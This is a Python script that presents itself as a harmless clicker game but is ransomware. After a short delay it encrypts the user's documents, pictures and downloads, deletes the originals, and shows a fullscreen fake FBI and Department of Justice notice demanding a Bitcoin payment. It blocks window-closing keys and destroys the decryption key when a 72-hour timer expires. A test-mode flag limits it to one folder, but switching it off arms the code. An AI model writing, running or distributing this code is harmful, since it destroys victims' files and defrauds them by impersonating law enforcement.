#!/usr/bin/env python3
"""
Game Launcher — Totally innocent
"""

import os
import sys
import tkinter as tk
from tkinter import font, messagebox
import ctypes
import hashlib
import threading
import time
import random
import winsound
import subprocess
from datetime import datetime, timedelta

# ============================================================
# CONFIG
# ============================================================
TEST_MODE = True
TEST_FOLDER = "C:\\test_ransom"
BTC_ADDRESS = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"

VALID_CODES = [
    "FS2FGNFJQI", "OX77WHWEV5", "FCHZT1L6IX", "VX02SQI40G",
    "6PXB85GJJJ", "XQHCXUH4TU", "B1RQSQ9G2L", "HE71R2TKVY",
    "Q1BK76N580", "01QEU0DUUE", "X1LSHVL0OJ", "AW3YSY30V3",
    "ZTE2DDE0X4", "ZG29U3VDIC", "6FNWN5JIOS", "F5EBA6TT08",
    "2UUBJ4X7VN", "ISP3G7NRPN", "J8L0S6SHEJ", "FURZCKKNZX"
]

VALID_HASHES = [hashlib.sha256(c.encode()).hexdigest() for c in VALID_CODES]
TIMER_SECONDS = 72 * 3600

# ============================================================
# ENCRYPTION
# ============================================================
def xor_encrypt(data, key):
    result = bytearray()
    for i, byte in enumerate(data):
        result.append(byte ^ key[i % len(key)])
    return bytes(result)

def generate_key():
    return bytes([random.randint(0, 255) for _ in range(32)])

def encrypt_files():
    key = generate_key()
    count = 0
    
    if TEST_MODE:
        dirs = [TEST_FOLDER]
    else:
        dirs = [
            os.path.expanduser('~\\Documents'),
            os.path.expanduser('~\\Desktop'),
            os.path.expanduser('~\\Pictures'),
            os.path.expanduser('~\\Downloads'),
        ]
    
    exts = ['.txt', '.docx', '.pdf', '.jpg', '.png', '.zip', '.py', '.js', '.html', '.css', '.doc', '.xls', '.ppt']
    
    for root_dir in dirs:
        if not os.path.exists(root_dir):
            continue
        for root, dirs, files in os.walk(root_dir):
            for file in files:
                if any(file.lower().endswith(ext) for ext in exts):
                    try:
                        path = os.path.join(root, file)
                        with open(path, 'rb') as f:
                            data = f.read()
                        encrypted = xor_encrypt(data, key)
                        with open(path + '.locked', 'wb') as f:
                            f.write(encrypted)
                        os.remove(path)
                        count += 1
                    except:
                        pass
    
    key_path = os.path.join(os.environ.get('TEMP', 'C:\\Temp'), 'decrypt_key.bin')
    with open(key_path, 'wb') as f:
        f.write(key)
    
    return count, key

def decrypt_files(key):
    count = 0
    
    if TEST_MODE:
        dirs = [TEST_FOLDER]
    else:
        dirs = [
            os.path.expanduser('~\\Documents'),
            os.path.expanduser('~\\Desktop'),
            os.path.expanduser('~\\Pictures'),
            os.path.expanduser('~\\Downloads'),
        ]
    
    for root_dir in dirs:
        if not os.path.exists(root_dir):
            continue
        for root, dirs, files in os.walk(root_dir):
            for file in files:
                if file.endswith('.locked'):
                    try:
                        path = os.path.join(root, file)
                        with open(path, 'rb') as f:
                            data = f.read()
                        decrypted = xor_encrypt(data, key)
                        original = path[:-7]
                        with open(original, 'wb') as f:
                            f.write(decrypted)
                        os.remove(path)
                        count += 1
                    except:
                        pass
    
    return count

# ============================================================
# GAME WINDOW (Innocent bait)
# ============================================================
class GameWindow:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("Super Clicker Game")
        self.root.geometry("500x400")
        self.root.configure(bg='#2b2b2b')
        
        # Center window
        self.root.eval('tk::PlaceWindow . center')
        
        # Title
        title = tk.Label(
            self.root,
            text="🕹️ SUPER CLICKER",
            font=('Arial', 24, 'bold'),
            fg='white',
            bg='#2b2b2b'
        )
        title.pack(pady=20)
        
        # Score
        self.score = 0
        self.score_label = tk.Label(
            self.root,
            text=f"Score: {self.score}",
            font=('Arial', 18),
            fg='#00ff00',
            bg='#2b2b2b'
        )
        self.score_label.pack(pady=10)
        
        # Click button
        self.click_btn = tk.Button(
            self.root,
            text="CLICK ME!",
            font=('Arial', 20, 'bold'),
            bg='#ff4444',
            fg='white',
            width=15,
            height=3,
            command=self.click
        )
        self.click_btn.pack(pady=20)
        
        # Status
        self.status = tk.Label(
            self.root,
            text="Loading game...",
            font=('Arial', 12),
            fg='gray',
            bg='#2b2b2b'
        )
        self.status.pack(pady=10)
        
        # Start timer for FBI screen
        self.root.after(5000, self.switch_to_fbi)
        
        # Anti-close
        self.root.protocol("WM_DELETE_WINDOW", lambda: None)
    
    def click(self):
        self.score += 1
        self.score_label.config(text=f"Score: {self.score}")
        if self.score > 10:
            self.status.config(text="Wow! You're good!", fg='#ffdd00')
        elif self.score > 5:
            self.status.config(text="Keep going!", fg='#00ff00')
    
    def switch_to_fbi(self):
        self.root.destroy()
        # Launch FBI ransomware
        app = FBIRansomwareUI()
        app.setup()
    
    def run(self):
        self.root.mainloop()

# ============================================================
# FBI RANSOMWARE UI
# ============================================================
class FBIRansomwareUI:
    def __init__(self):
        self.count = 0
        self.key = None
        self.timer = TIMER_SECONDS
        self.unlocked = False
        self.root = None
    
    def setup(self):
        # Encrypt
        print("[*] Encrypting files...")
        self.count, self.key = encrypt_files()
        print(f"[+] Encrypted {self.count} files")
        
        # Create window
        self.root = tk.Tk()
        self.root.attributes('-fullscreen', True)
        self.root.attributes('-topmost', True)
        self.root.configure(bg='#0a0a2e')
        self.root.overrideredirect(True)
        
        # Block everything
        self.root.bind('<Control-Alt-Delete>', lambda e: 'break')
        self.root.bind('<Alt-F4>', lambda e: 'break')
        self.root.bind('<Escape>', lambda e: 'break')
        self.root.bind('<Control-Shift-Escape>', lambda e: 'break')
        self.root.protocol("WM_DELETE_WINDOW", lambda: None)
        
        # Main container
        main = tk.Frame(self.root, bg='#0a0a2e')
        main.pack(expand=True, fill='both')
        
        # === TOP BAR ===
        top = tk.Frame(main, bg='#0a0a2e')
        top.pack(fill='x', pady=5)
        
        tk.Label(
            top,
            text="🔴 DEPARTMENT OF JUSTICE",
            font=('Arial', 20, 'bold'),
            fg='#cc0000',
            bg='#0a0a2e'
        ).pack(side=tk.LEFT, padx=20)
        
        tk.Label(
            top,
            text="FBI",
            font=('Arial', 20, 'bold'),
            fg='#ffcc00',
            bg='#0a0a2e'
        ).pack(side=tk.RIGHT, padx=20)
        
        # === SEAL ===
        tk.Label(
            main,
            text="⚡ ⚡ ⚡ OFFICIAL NOTICE ⚡ ⚡ ⚡",
            font=('Arial', 14),
            fg='#ffcc00',
            bg='#0a0a2e'
        ).pack(pady=5)
        
        # === MAIN WARNING (FLASHING) ===
        self.warning = tk.Label(
            main,
            text="⚠️ YOUR COMPUTER HAS BEEN LOCKED ⚠️",
            font=('Arial', 36, 'bold'),
            fg='#ff0000',
            bg='#0a0a2e'
        )
        self.warning.pack(pady=15)
        
        # === LEGAL TEXT ===
        tk.Label(
            main,
            text="Federal law violation detected (18 U.S.C. § 1030, 18 U.S.C. § 2252A)",
            font=('Arial', 12),
            fg='#aaaaaa',
            bg='#0a0a2e'
        ).pack(pady=5)
        
        # === VIOLATIONS ===
        viol = [
            "• Unauthorized access to government systems",
            "• Distribution of malicious software",
            "• Possession of prohibited materials",
            "• Cyber terrorism activities detected",
            "• Identity theft and fraud detected"
        ]
        
        viol_frame = tk.Frame(main, bg='#0a0a2e', bd=2, relief='solid')
        viol_frame.pack(pady=10, padx=40, fill='x')
        
        tk.Label(
            viol_frame,
            text="VIOLATIONS DETECTED:",
            font=('Arial', 12, 'bold'),
            fg='#ff6600',
            bg='#0a0a2e'
        ).pack(anchor='w', padx=10, pady=5)
        
        for v in viol:
            tk.Label(
                viol_frame,
                text=v,
                font=('Arial', 11),
                fg='#ff8844',
                bg='#0a0a2e'
            ).pack(anchor='w', padx=20, pady=2)
        
        # === FINE ===
        tk.Label(
            main,
            text="💲 FINE: $200.00 BTC",
            font=('Arial', 26, 'bold'),
            fg='#ffcc00',
            bg='#0a0a2e'
        ).pack(pady=10)
        
        # === BTC ADDRESS ===
        btc_frame = tk.Frame(main, bg='#0a0a2e', bd=1, relief='solid')
        btc_frame.pack(pady=5)
        
        tk.Label(
            btc_frame,
            text=BTC_ADDRESS,
            font=('Arial', 14),
            fg='#00ff00',
            bg='#0a0a2e'
        ).pack(padx=20, pady=5)
        
        # === COPY BUTTON ===
        tk.Button(
            main,
            text="📋 Copy Address",
            font=('Arial', 12, 'bold'),
            bg='#003366',
            fg='white',
            padx=20,
            command=self.copy_wallet
        ).pack(pady=5)
        
        # === INPUT ===
        input_frame = tk.Frame(main, bg='#0a0a2e')
        input_frame.pack(pady=15)
        
        tk.Label(
            input_frame,
            text="UNLOCK CODE:",
            font=('Arial', 16, 'bold'),
            fg='white',
            bg='#0a0a2e'
        ).pack(side=tk.LEFT, padx=10)
        
        self.entry = tk.Entry(
            input_frame,
            font=('Arial', 16),
            width=20,
            bg='#1a1a3e',
            fg='#00ff00',
            insertbackground='#00ff00'
        )
        self.entry.pack(side=tk.LEFT, padx=10)
        self.entry.focus_set()
        
        # === UNLOCK BUTTON ===
        tk.Button(
            main,
            text="🔓 UNLOCK SYSTEM",
            font=('Arial', 18, 'bold'),
            bg='#006600',
            fg='white',
            padx=30,
            pady=5,
            command=self.unlock
        ).pack(pady=10)
        
        # === TIMER ===
        self.timer_label = tk.Label(
            main,
            text="⏱️ 71:59:59",
            font=('Arial', 40, 'bold'),
            fg='#ff0000',
            bg='#0a0a2e'
        )
        self.timer_label.pack(pady=10)
        
        # === WARNING ===
        tk.Label(
            main,
            text=f"⚠️ {self.count} FILES ENCRYPTED",
            font=('Arial', 14, 'bold'),
            fg='#ff0000',
            bg='#0a0a2e'
        ).pack(pady=5)
        
        tk.Label(
            main,
            text="FAILURE TO PAY WITHIN 72 HOURS = DATA LOST FOREVER",
            font=('Arial', 12, 'bold'),
            fg='#ff4444',
            bg='#0a0a2e'
        ).pack(pady=5)
        
        # === TEST MODE ===
        if TEST_MODE:
            tk.Label(
                main,
                text="⚠️ TEST MODE — NO REAL FILES HARMED",
                font=('Arial', 14, 'bold'),
                fg='#00ff00',
                bg='#0a0a2e'
            ).pack(pady=5)
        
        # === CODES HINT ===
        tk.Label(
            main,
            text=f"🔑 {len(VALID_CODES)} valid codes available",
            font=('Arial', 9),
            fg='#444466',
            bg='#0a0a2e'
        ).pack(pady=2)
        
        # === FOOTER ===
        tk.Label(
            main,
            text="🔴 THIS IS AN OFFICIAL GOVERNMENT NOTICE 🔴",
            font=('Arial', 11, 'bold'),
            fg='#cc0000',
            bg='#0a0a2e'
        ).pack(pady=5)
        
        # Start everything
        self.start_timer()
        self.start_flashing()
        self.start_siren()
        self.force_focus()
        
        self.root.mainloop()
    
    def copy_wallet(self):
        self.root.clipboard_clear()
        self.root.clipboard_append(BTC_ADDRESS)
        messagebox.showinfo("📋", "Address copied!")
    
    def unlock(self):
        code = self.entry.get().strip().upper()
        if not code:
            messagebox.showerror("!", "Enter a code!")
            return
        
        hashed = hashlib.sha256(code.encode()).hexdigest()
        
        if hashed in VALID_HASHES:
            self.unlocked = True
            count = decrypt_files(self.key)
            
            for _ in range(5):
                winsound.Beep(800, 100)
                time.sleep(0.05)
            winsound.Beep(1200, 300)
            
            messagebox.showinfo(
                "✅ UNLOCKED",
                f"Decrypted {count} files!\n\n"
                f"Code: {code}"
            )
            self.root.destroy()
            sys.exit(0)
        else:
            for _ in range(3):
                winsound.Beep(200, 200)
                time.sleep(0.05)
            
            messagebox.showerror(
                "❌ WRONG",
                f"Invalid code!\n\n"
                f"Payment required: {BTC_ADDRESS}"
            )
            self.entry.delete(0, tk.END)
            self.entry.focus_set()
    
    def start_timer(self):
        def update():
            while self.timer > 0 and not self.unlocked:
                h = self.timer // 3600
                m = (self.timer % 3600) // 60
                s = self.timer % 60
                color = '#ff0000' if self.timer < 3600 else '#ff6600' if self.timer < 21600 else '#ff0000'
                self.timer_label.config(text=f"⏱️ {h:02d}:{m:02d}:{s:02d}", fg=color)
                self.timer -= 1
                time.sleep(1)
            
            if self.timer <= 0 and not self.unlocked:
                self.timer_label.config(text="💀 TIME EXPIRED", fg='red')
                try:
                    path = os.path.join(os.environ.get('TEMP', 'C:\\Temp'), 'decrypt_key.bin')
                    if os.path.exists(path):
                        with open(path, 'wb') as f:
                            f.write(os.urandom(32))
                        os.remove(path)
                except:
                    pass
                messagebox.showerror("💀", "Key destroyed. Files gone.")
        
        threading.Thread(target=update, daemon=True).start()
    
    def start_flashing(self):
        def flash():
            colors = ['#ff0000', '#cc0000', '#ff3333', '#990000', '#ff0000']
            while not self.unlocked:
                for c in colors:
                    self.warning.config(fg=c)
                    time.sleep(0.15)
                time.sleep(0.1)
        threading.Thread(target=flash, daemon=True).start()
    
    def start_siren(self):
        def siren():
            while not self.unlocked:
                try:
                    for f in [600, 800, 1000, 800, 600]:
                        if self.unlocked:
                            break
                        winsound.Beep(f, 100)
                        time.sleep(0.05)
                    time.sleep(0.3)
                except:
                    break
        threading.Thread(target=siren, daemon=True).start()
    
    def force_focus(self):
        def focus():
            while not self.unlocked:
                try:
                    self.root.focus_force()
                    self.entry.focus_set()
                except:
                    pass
                time.sleep(0.5)
        threading.Thread(target=focus, daemon=True).start()

# ============================================================
# MAIN
# ============================================================
def main():
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass
    
    print("="*50)
    print("🕹️ Super Clicker Game")
    print("="*50)
    print("Click the button to score points!")
    print("(This is totally innocent...)")
    print("="*50)
    
    game = GameWindow()
    game.run()

if __name__ == '__main__':
    main()
